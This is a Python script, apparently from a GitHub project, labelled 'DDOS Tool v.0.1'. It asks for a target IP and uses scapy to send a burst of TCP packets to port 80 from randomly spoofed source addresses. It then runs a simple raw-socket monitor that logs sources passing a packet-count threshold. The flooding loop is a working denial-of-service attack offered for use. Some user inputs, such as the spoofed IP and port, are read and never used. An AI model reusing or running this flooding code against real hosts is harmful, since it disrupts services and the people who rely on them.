#!/usr/bin/python3

import random
import socket
import struct
from datetime import datetime
from scapy.all import *

# Constants for detection thresholds
D_VAL = 10
D_VAL1 = D_VAL + 10

# Printing the header for the tool
print("\t\t/////////////////////////////////////////////////")
print("\t\t_________________________________________________")
print("\t\t\t\t DDOS Tool v.0.1")
print("\t\t\t\t For any Problems open an Issues")
print("\t\t\t\t https://github.com/LightYagami28/D.C.U-DDOS-Tool\t\t\t")
print("\t\t_________________________________________________")
print("\t\t\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n")

# User input for spoofed IP, target IP, and port
src_ip = input("Enter Your Spoofed IP: ")
target_ip = input("Enter the Target IP: ")
src_port = int(input("Enter the Port: "))

i = 1

# Main loop for sending packets
while True:
    # Generate a random spoofed source IP address
    src = ".".join(str(random.randint(1, 254)) for _ in range(4))
    print("Spoofed Source IP:", src)

    # Generate a random source port range
    src_port_range = (random.randint(1, 1000), random.randint(1000, 65535))

    # Build the IP/TCP packet
    ip_pkt = IP(src=src, dst=target_ip)
    tcp_pkt = TCP(sport=src_port_range[0], dport=80)
    pkt = ip_pkt / tcp_pkt

    # Send the packet with a very short interval
    send(pkt, inter=0.0001)
    print(f"Sent packet #{i} to {target_ip} from {src} on port {src_port_range[0]}-{src_port_range[1]}")
    i += 1

    # Break the loop after sending a specified number of packets
    if i > 1000:
        break

# Setup for packet detection
sock = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, 8)
packet_dict = {}

# Log the detection results
with open("dos_detection.log", 'a') as file_txt:
    file_txt.write("**********\n")
    file_txt.write(str(datetime.now()) + "\n")
    file_txt.write("**********\n")
    print("Detection Start ...")

    # Detection loop to capture and analyze incoming packets
    while True:
        pkt = sock.recvfrom(2048)
        ip_header = pkt[0][14:34]
        ip_hdr = struct.unpack("!8sB3s4s4s", ip_header)
        src_ip = socket.inet_ntoa(ip_hdr[3])
        print("Source IP:", src_ip)

        # Check if the source IP has been seen before and update the packet count
        if src_ip in packet_dict:
            packet_dict[src_ip] += 1
        else:
            packet_dict[src_ip] = 1

        # DDOS detection logic
        if packet_dict[src_ip] > D_VAL and packet_dict[src_ip] < D_VAL1:
            log_entry = f"DDOS Detected from {src_ip} with {packet_dict[src_ip]} packets\n"
            file_txt.write(log_entry)
            print("DDOS Detected:", src_ip)
        elif packet_dict[src_ip] > D_VAL1:
            packet_dict[src_ip] = D_VAL  # Reset the counter after a certain threshold to avoid false positives
